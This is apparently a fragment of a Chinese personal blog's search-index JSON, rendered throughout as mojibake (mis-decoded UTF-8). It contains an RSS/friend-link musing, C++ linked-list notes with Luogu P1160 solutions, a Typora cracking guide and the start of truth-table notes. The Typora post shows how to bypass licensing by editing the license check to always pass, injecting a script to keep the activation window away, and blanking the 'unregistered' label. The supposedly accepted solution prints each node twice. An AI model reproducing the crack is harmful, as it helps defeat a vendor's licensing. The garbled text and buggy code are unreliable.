âœ…\næˆ‘çœ‹å¾ˆå¤šå¤§ä½¬ä¸Šé¢éƒ½æŒ‚ç€ä¸€ä¸ªRSSè®¢é˜…ï¼Œæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œæˆ‘èƒ½æå—ï¼Ÿ\nå¥½åƒæŒºé«˜çº§çš„ï¼Œå¯æ˜¯ç°åœ¨æˆ‘è¿å‹é“¾éƒ½æ²¡æœ‰ï¼Œæˆ‘éœ€è¦å»å¥½å¥½æŠ˜è…¾ä¸€ä¸‹ã€‚\n\næˆåŠŸæäº†ä¸€ä¸ªrssè®¢é˜…â€¦ä½†åº”è¯¥åªæœ‰æˆ‘è‡ªå·±ä¼šè®¢é˜…æˆ‘è‡ªå·±å§ï¼Œæ¯•ç«Ÿæˆ‘çš„æ–‡ç« æ²¡æœ‰ä»€ä¹ˆå¾ˆå«ä»·å€¼ï¼Œå¼•äººæ€è€ƒçš„å†…å®¹ğŸ¤•\n\n---\n### æ‹‰åˆ°å‹é“¾ä¸Šçš„æœ‹å‹\næˆ‘å†™åšå®¢å¤§å¤šæ•°è¿˜æ˜¯ç»™è‡ªå·±ç•™ä¸ªè®°å½•ï¼Œåœ¨ç½‘ç«™ä¸Šç¾è§‚åœ°çœ‹æˆ‘çš„è®°å½•ï¼Œæ¢å°è®¾å¤‡åªè¦æµè§ˆæˆ‘çš„åšå®¢ç½‘ç«™å°±å¯ä»¥éšæ—¶éšåœ°çš„å»è·å–ä¿¡æ¯ï¼Œå¾ˆæ–¹ä¾¿ã€‚\nä½†æ˜¯æˆ‘ä¹Ÿå¸Œæœ›æœ‰ä¸€ä¸ªèƒ½æŒ‚åœ¨å‹é“¾ä¸Šçš„æœ‹å‹...ä¸æ˜¯å¸¦æœ‰åŠŸåˆ©æ€§çš„ï¼Œåªæ˜¯æƒ³åœ¨è¿™ä¸ªå°åœˆå­é‡Œï¼Œå¤šä¸€ä¸ªå¯ä»¥åˆ†äº«æ€è€ƒå’Œæ„Ÿæ‚Ÿçš„äººå§ã€‚\n\n**æœªå®Œå¾…ç»­...**","tags":["è®°å½•","è®¡åˆ’","ç”Ÿæ´»"],"categories":["æ‚è°ˆ"]},{"title":"æ•°æ®ç»“æ„-çº¿æ€§è¡¨ç¬”è®°","url":"/2025/02/26/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-xian-xing-biao-bi-ji/","content":"# æ•°æ®ç»“æ„-çº¿æ€§è¡¨ç¬”è®°\n\næ™®é€šçš„æ•°ç»„ä¸å‡ºå…¥æ ˆåœ¨STLå¾ˆå¥½ç”¨ï¼Œä½†æ˜¯æ¶‰åŠé“¾è¡¨è¿›è¡ŒæŒ‡é’ˆæ“ä½œè¾ƒä¸ºè–„å¼±ï¼Œå› æ­¤è®°å½•ä¸€ä¸‹é“¾è¡¨çš„æ“ä½œã€‚\n\n---\n\n## é“¾è¡¨çš„åˆ›å»º\n\n### å•å‘é“¾è¡¨çš„åˆ›å»º\n\n```cpp\nstruct Node // åˆ›å»ºå•å‘é“¾è¡¨\n{\n    int data; //æ•°æ®\n    Node *next; //æŒ‡å‘ä¸‹ä¸€å…ƒç´ \n};\n```\n\n**å•å‘é“¾è¡¨çš„æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ï¼Œæ’å…¥å’Œåˆ é™¤çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)(nä¸ºé“¾è¡¨é•¿åº¦)ï¼ŒæŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)(nä¸ºé“¾è¡¨é•¿åº¦)**\n\n---\n\n### åŒå‘é“¾è¡¨çš„åˆ›å»º\n\n```cpp\nstruct Node // åˆ›å»ºåŒå‘é“¾è¡¨\n{\n    int data;\n    Node *next; // æŒ‡å‘ä¸‹ä¸€å…ƒç´ \n    Node *prev;// æŒ‡å‘ä¸Šä¸€å…ƒç´ \n};\n```\n\n**åŒå‘é“¾è¡¨çš„æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸å•å‘é“¾è¡¨ç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ’å…¥å’Œåˆ é™¤æ—¶éœ€è¦æ›´æ”¹æŒ‡é’ˆçš„æŒ‡å‘ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸ºO(n)(nä¸ºé“¾è¡¨é•¿åº¦)**\n\n---\n\n### å—çŠ¶é“¾è¡¨,å¾ªç¯é“¾è¡¨çš„åˆ›å»º\n\néƒ½ä¸åŸºæœ¬é“¾è¡¨çš„åˆ›å»ºæœ‰å…³ã€‚\n\n- å¾ªç¯é“¾è¡¨å°†æœ«å°¾å…ƒç´ çš„nextæŒ‡é’ˆæŒ‡å‘é¦–å…ƒç´ ï¼Œæ„å»ºå¾ªç¯ã€‚\n\n  ```cpp\n  // å¾ªç¯é“¾è¡¨çš„æ„å»º\n  struct CircularNode {\n      int data;\n      CircularNode* next;\n  };\n  // åœ¨æ’å…¥æ•°æ®æ—¶å€™ï¼Œæœ«å°¾è¿›è¡Œ\n  newNode->next = head;\n  ```\n\n  \n\n- å—çŠ¶é“¾è¡¨æ˜¯ç”±å¤šä¸ªé“¾è¡¨æ‹¼æ¥ï¼Œå­˜å‚¨çš„æ•°æ®ï¼ˆdataï¼‰æ˜¯ä¸åŒé“¾è¡¨çš„æŒ‡é’ˆã€‚\n\n  ```cpp\n  // å—çŠ¶é“¾è¡¨çš„æ„å»º\n  struct Block {\n      vector<Node*> nodes;\n      Block* next;\n      Block* prev;\n  };\n  ```\n\n  **åŒå‘é“¾è¡¨ä¸æŒ‡é’ˆç»“åˆï¼Œæ„å»ºè¿æ¥ä¸åŒåŒå‘é“¾è¡¨çš„å—çŠ¶é“¾è¡¨ï¼Œå­˜å‚¨æ•°æ®çš„åŒæ—¶ï¼Œè¿˜å­˜å‚¨äº†æŒ‡å‘å‰åå—çš„æŒ‡é’ˆï¼Œè¿™æ ·å°±å¯ä»¥åœ¨O(sqrt(n))çš„æ—¶é—´å†…æ‰¾åˆ°ä»»æ„ä¸€ä¸ªå…ƒç´ ã€‚ä½¿ç”¨å—çŠ¶é“¾è¡¨ï¼Œå¯ä»¥å‡å°‘æŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦ï¼Œä¸ºO(sqrt(n))ã€‚**\n\n---\n\n## é“¾è¡¨çš„åŸºæœ¬æ“ä½œ\n\n### é“¾è¡¨çš„æ’å…¥\n\n**ï¼ˆè¿™é‡Œä»¥å•å‘é“¾è¡¨ä¸ºä¾‹)**\n\n```cpp\nvoid insert(Node *&head, int value)\n{\n    Node *newNode = new Node(); // åˆ›å»ºä¸€ä¸ªæ–°çš„ç»“ç‚¹\n    newNode->data = value;    // èµ‹å€¼\n    newNode->next = nullptr;  // åˆå§‹åŒ–nextæŒ‡é’ˆ\n    if (head == nullptr)\n    {\n        head = newNode;\n    } // å¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œç›´æ¥æ’å…¥\n    else\n    {\n        Node *temp = head;\n        while (temp->next != nullptr) // éå†é“¾è¡¨ï¼Œæ‰¾åˆ°æœ€åä¸€ä¸ªç»“ç‚¹\n        {\n            temp = temp->next;\n        }\n        temp->next = newNode;\n    }\n}\n```\n\né€»è¾‘å¾ˆç®€å•ã€‚\n\n- å…ˆåˆ›ä¸€ä¸ªæ–°ç»“ç‚¹ï¼ˆå› ä¸ºæ˜¯æŒ‡é’ˆå½¢å¼çš„ï¼Œæ‰€ä»¥ç”¨newå½¢å¼å»ºç«‹ï¼‰ã€‚\n\n- ç„¶åç»™dataèµ‹å€¼ã€‚\n\n- å†çœ‹çœ‹å®ƒè¦æ’å…¥çš„åœ°æ–¹æ˜¯ä¸æ˜¯headï¼Œæ˜¯headå°±ç®€å•ï¼Œç›´æ¥æŠŠå®ƒçš„nextè®¾ç«‹ä¸ºheadã€‚\n\n  >  *å¦‚æœæ˜¯åŒå‘é“¾è¡¨å°±å†æ³¨æ„ä¸€ä¸‹headçš„prevæ”¹æˆæ–°ç»“ç‚¹*\n\n- ä¸æ˜¯headçš„è¯ï¼Œç›´æ¥whileæ‰¾åˆ°è¦æ’å…¥çš„ä½ç½®ï¼ˆè¿™é‡Œè‡ªå·±è®¾å®šwhileçš„å¾ªç¯æ¡ä»¶ï¼‰ï¼Œç„¶åæ”¹è¦æ’å…¥ä½ç½®çš„å‰è€…nextä¸ºå®ƒçš„nextï¼Œç„¶åæŠŠå‰è€…çš„nextæ”¹ä¸ºå®ƒã€‚\n\n  > å¦‚æœæ˜¯åŒå‘é“¾è¡¨çš„è¯æ³¨æ„ä¸€ä¸‹å‰è€…çš„nextçš„prevä¹Ÿè¦æ”¹æˆå®ƒï¼Œå®ƒçš„prevæ”¹æˆå‰è€…ã€‚\n   ```cpp\n     while (temp->id != k)//kä¸ºè¦æ’å…¥çš„ä½ç½®ï¼Œè¿™é‡Œåšä¸ªç¤ºèŒƒ\n           {\n               temp = temp->next;\n           }\n           if (temp->next != nullptr)\n           {\n               temp->next->prev = newNode;\n           }\n           newNode->next = temp->next;\n          temp->next = newNode;\n   ```\n\n- ç„¶åæ”¹å®Œäº†å°±å®Œäº‹ï¼Œæ’å…¥ä¸€ä¸ªç»“ç‚¹å˜›ã€‚\n\n  **ä¸è¿‡è¿™ä¸ªæ–¹æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼Œåœ¨è¿›è¡Œå¤§æ•°æ®çš„éå†çš„æ—¶å€™å’Œæœ‰å¯èƒ½è€—æ—¶å·¨å¤§ï¼Œä¹‹åçš„å­¦ä¹ ç”Ÿæ´»ä¸­ä¼šå­¦ä¹ äºŒå‰æ ‘ï¼Œå“ˆå¸Œè¡¨ç­‰æ–¹æ³•æ¥ä¼˜åŒ–**ã€‚\n\n  ---\n\n### é“¾è¡¨çš„ç»“ç‚¹åˆ é™¤\n\n```cpp\nvoid deleteData(Node *&head, int value)\n{\n    Node *temp = head;\n    Node *prev = nullptr;\n    if (temp != nullptr && temp->data == value)\n    {\n        head = temp->next;\n        delete temp;\n        return;\n    } // åˆ é™¤å¤´ç»“ç‚¹\n    while (temp != nullptr && temp->data != value)\n    {\n        prev = temp;\n        temp = temp->next;\n    } // æ‰¾åˆ°è¦åˆ é™¤çš„ç»“ç‚¹ï¼Œéå†\n    if (temp == nullptr)\n    {\n        return;\n    } // æ²¡æ‰¾åˆ°è¦åˆ é™¤çš„ç»“ç‚¹ï¼Œæ²¡æœ‰å€¼å¯¹åº”çš„é“¾è¡¨èŠ‚ç‚¹\n    prev->next = temp->next;\n    delete temp;\n}\n```\n\n**é¦–å…ˆæœ€é‡è¦çš„ï¼Œheadçš„å‡½æ•°å¼•ç”¨ä¸º&headï¼å› ä¸ºheadå¾ˆæœ‰å¯èƒ½ä¹Ÿæ˜¯åˆ é™¤ç»“ç‚¹ï¼**\n\n**å¦åˆ™é€€å‡ºå‡½æ•°åheadå¹¶æ²¡æœ‰è¿›è¡Œæ”¹å˜æ“ä½œï¼Œå°†ä¼šé€ æˆREå³è¿è¡Œæ—¶é”™è¯¯ã€‚**\n\n- å…ˆå»ºç«‹ä¸€ä¸ªtempç»“ç‚¹ï¼Œç»™å®ƒå…ˆå˜æˆheadç»“ç‚¹ï¼Œè¿™æ ·å¯ä»¥è§£å†³headå› ä¸ºæ˜¯å¼•ç”¨å½¢å¼çš„ä¸èƒ½è½»æ˜“å»æ”¹å˜å€¼çš„é—®é¢˜ï¼Œåˆ©äºåç»­whileå¾ªç¯æ¥æŸ¥æ‰¾å€¼ã€‚\n\n- åœ¨å†™ä¹‹å‰è¦è€ƒè™‘ä¸‰ç§æƒ…å†µ\n  1. é“¾è¡¨æ˜¯ç©ºçš„ï¼Œé‚£åˆ ä»€ä¹ˆï¼Ÿ\n  2. é“¾è¡¨æ‰¾ä¸åˆ°æˆ‘è¦åˆ æ‰çš„å€¼ï¼Œé‚£åˆ ä»€ä¹ˆï¼Ÿ\n  3. é“¾è¡¨è¦åˆ æ‰å¤´ï¼Œé‚£éå†ä»€ä¹ˆï¼Ÿ\n\n- ç„¶åç”¨ifæ¥åˆ¤æ–­ä¸€ä¸‹æƒ…å†µã€‚\n\n  - å…ˆè€ƒè™‘å¦‚æœæ˜¯é“¾è¡¨æ˜¯ç©ºçš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ä»€ä¹ˆéƒ½ä¸åšäº†ã€‚\n\n    ``` if (temp == nullptr) return;```\n\n  - å†æƒ³æƒ³å¦‚æœåˆ æ‰å¤´ï¼Œé‚£æˆ‘ä»¬å°±ä¸ç”¨éå†äº†ã€‚\n\n    ``` cpp\n      if (temp != nullptr && temp->data == value)\n        {\n            head = temp->next;\n            delete temp;\n            return;\n        }\n    ```\n\n  - ç„¶åå°±å¯ä»¥å¼€å§‹æ„‰å¿«åœ°éå†äº†ã€‚\n\n    ```cpp\n    while (temp != nullptr && temp->data != value)\n        {\n            prev = temp;\n            temp = temp->next;\n        } // æ‰¾åˆ°è¦åˆ é™¤çš„ç»“ç‚¹ï¼Œéå†\n    ```\n\n  - æ‰¾åˆ°çš„è¯ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ªç»“ç‚¹çš„å‰è€…è¿æ¥åˆ°ä¸‹ä¸€ç»“ç‚¹ã€‚å¦‚æœæ˜¯åŒå‘é“¾è¡¨å¾ˆæ–¹ä¾¿ï¼Œç›´æ¥```temp->prev->next=temp->next```äº†ï¼Œä¸éœ€è¦prevçš„å‚ä¸ã€‚\n\n    ä½†è¿™é‡Œæ˜¯å•å‘é“¾è¡¨ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦æœ‰ä¸€ä¸ªä¸´æ—¶æŒ‡é’ˆæŒ‡å‘tempçš„å‰è€…çš„ï¼Œä¹Ÿå¡è¿›å»å¾ªç¯é‡Œå°±å¯ä»¥äº†ï¼Œç„¶åè¿›è¡Œä¸€æ ·çš„æ“ä½œã€‚\n\n    ```cpp\n    prev->next = temp->next;\n    ```\n\n  - æ²¡æ‰¾åˆ°çš„è¯ï¼Œé‚£æˆ‘ä»¬è¿™ä¸ªwhileçš„æ“ä½œä¸€ç›´è¿è¡Œï¼Œç›´åˆ°tempå˜æˆäº†é“¾è¡¨å°¾éƒ¨çš„nextï¼Œå³å°±æ˜¯ç©ºæŒ‡é’ˆNULLã€‚\n\n    **é‚£prevæŒ‡å‘çš„ç»“ç‚¹å°±æ˜¯åŸé“¾è¡¨å°¾éƒ¨ï¼Œtempä¸ºnullptrçš„è¯ï¼Œé‚£tempå°±æ²¡æœ‰nextçš„å€¼ã€‚è¿™æ ·çš„è¯è¿›è¡Œæœ€åä¸€æ­¥å°±ä¼šæŠ¥é”™ï¼Œæ³¨æ„è¿™é‡Œçš„å†…å­˜ç®¡ç†ã€‚**\n\n    è¿™é‡Œé€‰æ‹©ç”¨è¯­å¥ç›´æ¥åŒ…æ½1å’Œ2æƒ…å†µã€‚\n\n    ```cpp\n     if (temp == nullptr)\n        {\n            return;\n        } \n    ```\n\n  - è¿™é‡Œä½“ç°åˆ é™¤çš„æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‚\n  \n  ---\n\n### é“¾è¡¨çš„æ˜¾ç¤ºè¾“å‡º\n\nå¾ˆç®€å•ï¼Œä»å¤´å¼€å§‹whileå¾ªç¯è¾“å‡ºå€¼å³å¯ã€‚\n\n```cpp\nvoid printList(Node *head)\n{\n    Node *temp = head;\n    while (temp != nullptr)\n    {\n        cout << temp->data << \" \";\n        temp = temp->next;\n    }\n    cout << endl;\n}\n```\n\nä¹Ÿæ˜¯ä»å¤´éå†åˆ°å°¾éƒ¨ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‚\n\n## é“¾è¡¨çš„æ“ä½œå®æˆ˜\n\n### å®æˆ˜é¢˜ç›®\n\né¢˜ç›®æºäºæ´›è°·æ•°æ®ç»“æ„é¢˜å•ã€æ•°æ®ç»“æ„1-1ã€‘çº¿æ€§è¡¨p1160[é˜Ÿåˆ—å®‰æ’](https://www.luogu.com.cn/problem/P1160)ã€‚\n\n---\n### **éACä»£ç **\n\n**é‡‡ç”¨åŸºç¡€çš„éå†æ¥è§£å†³é—®é¢˜**ï¼Œåœ¨æ•°æ®è¾ƒå°çš„æ—¶å€™å¯ä»¥æ»¡è¶³ç»“æœï¼Œè€Œæ•°æ®è¾ƒå¤§æ—¶å€™å› ä¸ºO(n^2)çš„æ—¶é—´å¤æ‚åº¦è€Œå¯¼è‡´TLEï¼Œè§£å†³æ–¹æ³•è§æ³¨é‡Šã€‚\n<details>\n  <summary>ç‚¹å‡»æŸ¥çœ‹ä»£ç  </summary>\n```cpp\n#include <iostream>\nusing namespace std;\n//é¢å¯¹å¤§æ•°æ®æ¥å†™ç›´æ¥æ’å…¥æ’åºï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(n^2)ã€‚\n//æ’å…¥æ’åºä¸åˆ é™¤çš„ä¼˜ç‚¹æ˜¯ä¸éœ€è¦é¢å¤–çš„ç©ºé—´ï¼Œç¼ºç‚¹æ˜¯æŸ¥æ‰¾æ—¶é—´å¤æ‚åº¦è¾ƒé«˜ã€‚\n//ä¼˜åŒ–çš„è¯å¯ä»¥è€ƒè™‘åˆ©ç”¨å“ˆå¸Œè¡¨ï¼ŒæŸ¥æ‰¾æ—¶é—´å¤æ‚åº¦ä¸ºO(1)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(n)\n//å¦å¤–ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨äºŒå‰æœç´¢æ ‘ï¼ŒæŸ¥æ‰¾æ—¶é—´å¤æ‚åº¦ä¸ºO(nlogn)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(n)\nstruct node\n{\n    int id;\n    node *prev;\n    node *next;\n};\nvoid insert(node *&head, int k, int i, bool left);\nvoid deleteValue(node *&head, int id);\nvoid printList(node *head);\nint main()\n{\n    ios::sync_with_stdio(false);\n    cin.tie(0);\n    cout.tie(0);\n    int n, m;\n    cin >> n;\n    node *head = new node();\n    head->id = 1;\n    head->next = nullptr;\n    head->prev = nullptr;\n    // é‡æ•´é¡ºåº\n    for (int i = 1; i < n; i++)\n    {\n        int k, p;\n        cin >> k >> p;\n        bool left = (p == 0 ? true : false);\n        insert(head, k, i, left);\n        // printList(head);\n    }\n    cin >> m;\n    for (int i = 0; i < m; i++)\n    {\n        int id;\n        cin >> id;\n        deleteValue(head, id);\n        // printList(head);\n    }\n    printList(head);\n} // é“¾è¡¨æ‰‹å†™æ•°æ®ç»“æ„ç‰ˆæœ¬\n\nvoid insert(node *&head, int k, int i, bool left)\n{\n    node *newNode = new node();\n    newNode->id = i + 1;\n    newNode->prev = nullptr;\n    newNode->next = nullptr;\n    node *temp = head;\n    if (!left)\n    {\n        while (temp->id != k)\n        {\n            temp = temp->next;\n        }\n        if (temp->next != nullptr)\n        {\n            temp->next->prev = newNode;\n        }\n        newNode->next = temp->next;\n        temp->next = newNode;\n        newNode->prev = temp;\n    }\n    else\n    {\n        while (temp->id != k)\n        {\n            temp = temp->next;\n        }\n        if (temp->prev == nullptr)\n        {\n            head = newNode;\n        }\n        else\n        {\n            temp->prev->next = newNode;\n        }\n        newNode->prev = temp->prev;\n        temp->prev = newNode;\n        newNode->next = temp;\n    }\n}\n\nvoid deleteValue(node *&head, int id)\n{\n    node *temp = head;\n    node *prior = nullptr;\n    if (temp != nullptr && temp->id == id)\n    {\n        head = temp->next;\n        head->prev = nullptr; // è¿™é‡Œå¯è¦å¯ä¸è¦\n        delete temp;\n        return;\n    } // åˆ é™¤å¤´èŠ‚ç‚¹\n    while (temp != nullptr && temp->id != id)\n    {\n        prior = temp;\n        temp = temp->next;\n    }\n    if (temp == nullptr)\n    {\n        return;\n    }\n    prior->next = temp->next;\n    prior->prev = temp->prev;\n    if (temp->next != nullptr)\n        temp->next->prev = prior;\n    delete temp;\n}\n\nvoid printList(node *head)\n{\n    node *temp = head;\n    while (temp != nullptr)\n    {\n        cout << temp->id << \" \";\n        temp = temp->next;\n    }\n    cout << endl;\n}\n```\n</details>\n\n---\n\n### é™„ç»å…¸è§£æ³•å“ˆå¸Œ+åŒå‘é“¾è¡¨ACä»£ç ã€‚\n**ä¼˜åŒ–ä»£ç ï¼Œå“ˆå¸Œå°†æŸ¥æ‰¾ä¸åˆ é™¤çš„æ—¶é—´å¤æ‚åº¦ä¼˜åŒ–ä¸ºO(1)ï¼Œç”¨ç©ºé—´æ¢æ—¶é—´**ã€‚\n<details><summary>ç‚¹å‡»æŸ¥çœ‹ä»£ç  </summary>\n```cpp\n#include <iostream>\n#include <unordered_map>\nusing namespace std;\n\nstruct node {\n    int id;\n    node *prev;\n    node *next;\n};\n\nvoid insert(node *&head, int k_id, int new_id, bool left, unordered_map<int, node*> &nodes) {\n    node *target = nodes[k_id];\n    node *newNode = new node();\n    newNode->id = new_id;\n    newNode->prev = nullptr;\n    newNode->next = nullptr;\n    nodes[new_id] = newNode;\n\n    if (!left) { // æ’å…¥åˆ°å³ä¾§\n        newNode->prev = target;\n        newNode->next = target->next;\n        if (target->next != nullptr) {\n            target->next->prev = newNode;\n        }\n        target->next = newNode;\n    } else { // æ’å…¥åˆ°å·¦ä¾§\n        newNode->next = target;\n        newNode->prev = target->prev;\n        if (target->prev != nullptr) {\n            target->prev->next = newNode;\n        } else {\n            head = newNode; // æ›´æ–°å¤´èŠ‚ç‚¹\n        }\n        target->prev = newNode;\n    }\n}\n\nvoid deleteNode(node *&head, int id, unordered_map<int, node*> &nodes) {\n    if (nodes.find(id) == nodes.end()) return;\n    node *target = nodes[id];\n\n    // æ›´æ–°å‰é©±èŠ‚ç‚¹\n    if (target->prev != nullptr) {\n        target->prev->next = target->next;\n    } else {\n        head = target->next; // åˆ é™¤çš„æ˜¯å¤´èŠ‚ç‚¹\n    }\n\n    // æ›´æ–°åç»§èŠ‚ç‚¹\n    if (target->next != nullptr) {\n        target->next->prev = target->prev;\n    }\n\n    nodes.erase(id);\n    delete target;\n}\n\nvoid printList(node *head) {\n    node *temp = head;\n    while (temp != nullptr) {\n        cout << temp->id << \" \";\n        cout << temp->id << \" \";\n        temp = temp->next;\n    }\n    cout << endl;\n}\n\nint main() {\n    ios::sync_with_stdio(false);\n    cin.tie(0);\n    cout.tie(0);\n\n    int n, m;\n    cin >> n;\n    node *head = new node();\n    head->id = 1;\n    head->prev = head->next = nullptr;\n    unordered_map<int, node*> nodes;\n    nodes[1] = head;\n\n    for (int i = 1; i < n; ++i) {\n        int k, p;\n        cin >> k >> p;\n        insert(head, k, i + 1, p == 0, nodes);\n    }\n\n    cin >> m;\n    while (m--) {\n        int id;\n        cin >> id;\n        deleteNode(head, id, nodes);\n    }\n\n    printList(head);\n\n    // é‡Šæ”¾å†…å­˜\n    node *current = head;\n    while (current) {\n        node *next = current->next;\n        delete current;\n        current = next;\n    }\n\n    return 0;\n}\n```\n</details>\n\n---","tags":["å­¦ä¹ ","æ•°æ®ç»“æ„","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"Typoraæ¿€æ´»æˆåŠŸ","url":"/2025/02/24/sheng-huo/ji-lu/typora-ji-huo-cheng-gong/","content":"# Typoraæ¿€æ´»æˆåŠŸ\n\n\nè®°å½•typoraæ¿€æ´»ï¼Œå‚è€ƒæ•™ç¨‹æ˜¯[CSDN](https://blog.csdn.net/qjkewdmgkq/article/details/139335063)ã€‚\nè‹¦äºä¸€äº›2022æ•™ç¨‹é‡Œé¢ä¸€äº›å¤§ä½¬çš„è„šæœ¬è¢«Banæ‰æ— æ³•git cloneï¼Œé‰´äºCSDNå®åœ¨æ˜¯è¿‡äºæ¶å¿ƒï¼ˆå¤åˆ¶è¦å¼€ä¼šå‘˜ï¼‰æ‰€ä»¥æŠŠè¿™ä¸ªåœ¨2025å¹´å¯ä»¥å®Œæˆçš„æ¿€æ´»æ•™ç¨‹è®°å½•ä¸€ä¸‹ã€‚\n\n## æ‰¾åˆ°è¦ä¿®æ”¹çš„js\nä¹‹å‰å¯»æ‰¾äº†å¾ˆå¤šæ•™ç¨‹éƒ½è¯´Typoraçš„æ¿€æ´»æ˜¯æ ¹æ®ä¸€ä¸ªlicenseçš„æ¿€æ´»æ˜¯å¦ä¸ºtrueè€Œå†³å®šçš„ï¼Œæ‰€ä»¥æœ¬åœ°ä¿®æ”¹é‚£ä¸ªéƒ¨åˆ†ä¹Ÿæ˜¯å®Œæˆäº†åå°æ¿€æ´»éƒ¨åˆ†ã€‚\n>æ–¹æ³•ï¼š\n>- è¿›å…¥..\\Typora\\resources\\page-dist\\static\\js\\LicenseIndex.180dd4c7.4da8909c.chunk.js\n>- ctrl+Fæœç´¢\"e.hasActivated=\"true\"\"ï¼Œå°†e.hasActivated=\"true\"==e.hasActivatedæ”¹ä¸ºe.hasActivated=\"true\"==\"true\"ã€‚\n>- åå°æ¿€æ´»æˆåŠŸã€‚\n\n\n## å…³é—­å¯åŠ¨æ¿€æ´»å¼¹çª—\n\n> æ–¹æ³•ï¼š\n>\n> - è¿›å…¥..\\Typora\\resources\\page-dist\\license.html\n>\n> - å®šä½åˆ°æœ€åçš„\n>\n>   ```</body></html>```\n>\n> - å°†å…¶æ”¹ä¸º\n>\n>   ```</body><script>window.onload=function(){setTimeout(()=>{window.close();},50000000);}</script></html>```\n\næ³¨æ„è¿™é‡Œçš„5000000ï¼Œå°ä¸€ç‚¹çš„æ•°å­—ä¸è¡Œï¼Œæœ‰data errorçš„é—®é¢˜ã€‚\n\n## å»é™¤å·¦ä¸‹è§’\"æœªæ¿€æ´»\"æç¤º\n\n> æ–¹æ³•ï¼š\n>\n> - è¿›å…¥..\\Typora\\resources\\locales\\zh-Hans.lproj\\Panel.json\n> - ctrl+Fæœç´¢\"UNREGISTERED\":\"æœªæ¿€æ´»\"ï¼Œå°†å…¶æ”¹ä¸º\"UNREGISTERED\":\"\"ï¼ˆæŠŠæœªæ¿€æ´»ä¸‰ä¸ªå­—åˆ æ‰å³å¯ï¼‰ã€‚\n\n## é‡æ–°æ‰“å¼€Typora\n\nå¯åŠ¨æ‰‹åŠ¨å…³æ‰æ¿€æ´»çª—å£ï¼Œä¹‹åä¸å†å‡ºç°ã€‚\n![æ¿€æ´»ç•Œé¢](/images/Typoraæ¿€æ´»æˆåŠŸ/typoraæ¿€æ´».png)\n\n## æ€»ç»“\næˆ‘å¹³æ—¶ç”¨Obsidianå†™markdownï¼Œç»¼åˆæ€§æ¯”Typoraé«˜ä¸€äº›ï¼Œè¿˜ä¸æ”¶è´¹ï¼Œä¸å¼¹å‡ºæ¥è®©ä½ æ¿€æ´»çš„æç¤ºï¼Œå› ä¸ºæ–‡ä»¶ç®¡ç†ä»€ä¹ˆçš„ä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œè¿˜æœ‰æŒºå¤šç¬¬ä¸‰æ–¹æ’ä»¶çš„ã€‚\né‚£ä¸ºä»€ä¹ˆè¦èŠ±é‚£ä¹ˆå¤šæ—¶é—´å»æ‰¾Typoraæ¿€æ´»ï¼Ÿ\nä¹Ÿè®¸æ˜¯å› ä¸ºTyporaç•Œé¢æŒºå¥½çœ‹çš„ã€‚ğŸ˜¹","tags":["å­¦ä¹ ","ç ´è§£"],"categories":["æ—¥å¸¸å­¦ä¹ "]},{"title":"ä¹¦å†™çœŸå€¼è¡¨æ³¨æ„äº‹é¡¹","url":"/2025/02/23/xue-xi/shu-xue/shu-xie-zhen-zhi-biao-zhu-yi-shi-xiang/","content":"# ä¹¦å†™çœŸå€¼è¡¨æ³¨æ„äº‹é¡¹\n\nGè€å¸ˆç»™çš„\n\n---\n\n### **1. ä¹¦å†™çœŸå€¼è¡¨çš„æ ¼å¼**\n\nä¸€èˆ¬æ¥è¯´ï¼ŒçœŸå€¼è¡¨çš„æ ¼å¼æ˜¯ **è¡¨æ ¼çŠ¶**ï¼Œæ¯ä¸€åˆ—å¯¹åº”ä¸€ä¸ªå˜é‡æˆ–è®¡ç®—ç»“æœï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ç§å¯èƒ½æƒ…å†µï¼š\n\n```\n| A | B | è®¡ç®—ç»“æœ |\n|:-:|:-:|:-:|\n| 0 | 0 | ? |\n| 0 | 1 | ? |\n| 1 | 0 | ? |\n| 1 | 1 | ? |\n```\n\nä½†æ‰‹å†™ä½œä¸šæ—¶ï¼Œå¯èƒ½ä¸æ˜¯æ¯ä¸ªäººéƒ½ä¹ æƒ¯ç”»è¡¨æ ¼ï¼Œä½ å¯ä»¥ï¼š\n\n- **è§„èŒƒç”»è¡¨æ ¼**ï¼ˆæœ€å¥½ç”¨ç›´å°ºï¼Œè®©è¡¨æ ¼å¯¹é½ï¼Œçœ‹èµ·æ¥æ¸…æ™°ï¼‰ã€‚\n- **å¦‚æœä¸ç”»è¡¨æ ¼ï¼Œä¹Ÿè¦å¯¹é½æ•°æ®**ï¼Œä¸è¦å†™å¾—æ­ªæ­ªæ‰­æ‰­ï¼Œå½±å“è®¡ç®—ã€‚\n\n---\n\n### **2. ä¹¦å†™é¡ºåº**\n\n1. **å…ˆåˆ—å‡ºè¾“å…¥å˜é‡ï¼ˆAã€Bã€C...ï¼‰**ï¼Œæ’åˆ—æ–¹å¼æŒ‰**äºŒè¿›åˆ¶é¡ºåº**ï¼š\n    \n    - ä¸¤ä¸ªå˜é‡ â†’ 00ã€01ã€10ã€11\n    - ä¸‰ä¸ªå˜é‡ â†’ 000ã€001ã€010ã€011ã€100ã€101ã€110ã€111\n    - ä»¥æ­¤ç±»æ¨ï¼Œè¡Œæ•°æ˜¯ ã€‚\n2. 